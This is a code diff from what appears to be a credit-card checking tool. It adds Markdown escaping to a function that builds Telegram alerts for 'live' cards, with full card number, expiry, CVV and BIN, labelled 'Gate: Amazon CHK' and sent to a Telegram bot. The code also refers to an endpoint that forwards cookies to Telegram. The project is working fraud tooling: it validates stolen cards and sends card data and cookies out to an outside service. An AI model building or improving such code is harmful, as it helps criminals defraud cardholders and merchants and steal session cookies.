@@ -3,6 +3,7 @@ const express = require('express');
 const router = express.Router();
 const { pool } = require('../database');
 const { sendLiveToTelegram } = require('../bot_telegram'); // Importar función del bot
+const { escapeMarkdown } = require('../bot_telegram');
 
 // ============================================
 // ENDPOINT 1: Enviar live a Telegram
@@ -210,27 +211,26 @@ function formatearMensajeTelegram(card, result) {
     const ultimos4 = numero.slice(-4);
     
     let mensaje = `🎯 *¡LIVE ENCONTRADA!* 🎯\n\n`;
-    mensaje += `💳 *Tarjeta:* \`${numeroFormateado}\`\n`;
-    mensaje += `📅 *Fecha:* ${mes}/${año}\n`;
-    mensaje += `🔐 *CVV:* ${cvv}\n`;
-    mensaje += `🔢 *BIN:* ${bin}\n`;
-    mensaje += `🔄 *Últimos 4:* ${ultimos4}\n\n`;
+    mensaje += `💳 *Tarjeta:* \`${escapeMarkdown(numeroFormateado)}\`\n`;
+    mensaje += `📅 *Fecha:* ${escapeMarkdown(mes)}/${escapeMarkdown(año)}\n`;
+    mensaje += `🔐 *CVV:* ${escapeMarkdown(cvv)}\n`;
+    mensaje += `🔢 *BIN:* ${escapeMarkdown(bin)}\n`;
+    mensaje += `🔄 *Últimos 4:* ${escapeMarkdown(ultimos4)}\n\n`;
     
     if (result) {
-        mensaje += `📊 *Resultado:* ${result.original_status || result.status || 'LIVE'}\n`;
+        mensaje += `📊 *Resultado:* ${escapeMarkdown(result.original_status || result.status || 'LIVE')}\n`;
         if (result.message) {
-            mensaje += `📝 *Detalle:* ${result.message}\n`;
+            mensaje += `📝 *Detalle:* ${escapeMarkdown(result.message)}\n`;
         }
     }
     
-    mensaje += `\n⏰ *Hora:* ${new Date().toLocaleString()}\n`;
+    mensaje += `\n⏰ *Hora:* ${escapeMarkdown(new Date().toLocaleString())}\n`;
     mensaje += `🛒 *Gate:* Amazon CHK\n`;
     mensaje += `\n━━━━━━━━━━━━━━━━━━━\n`;
     mensaje += `@AstralCHK_Bot`;
     
     return mensaje;
 }
-
 // ============================================
 // ENDPOINT 3: Enviar cookie a Telegram
 // ============================================
